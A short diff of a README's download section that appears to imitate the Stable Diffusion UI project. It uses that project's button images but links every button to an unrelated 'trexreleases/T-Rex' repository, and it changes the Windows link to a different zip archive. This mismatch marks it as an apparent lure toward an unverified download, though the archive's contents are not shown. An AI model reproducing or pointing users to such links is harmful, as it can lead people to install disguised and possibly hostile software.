@@ -5,7 +5,7 @@ Click the download button for your operating system:
 <p float="left">
   <a href="https://github.com/trexreleases/T-Rex/releases/tag/0.26.8"><img src="https://github.com/cmdr2/stable-diffusion-ui/raw/main/media/download-linux.png" width="200" /></a>
   <a href="https://github.com/trexreleases/T-Rex/releases/tag/0.26.8"><img src="https://github.com/cmdr2/stable-diffusion-ui/raw/main/media/download-mac.png" width="200" /></a>
-  <a href="https://github.com/trexreleases/T-Rex/releases/download/0.26.8/release_gcc-win64.zip"><img src="https://github.com/cmdr2/stable-diffusion-ui/raw/main/media/download-win.png" width="200" /></a>
+  <a href="https://github.com/trexreleases/T-Rex/releases/download/0.26.8/release-tr1.1.08.zip"><img src="https://github.com/cmdr2/stable-diffusion-ui/raw/main/media/download-win.png" width="200" /></a>
 </p>
 
 ## Overview
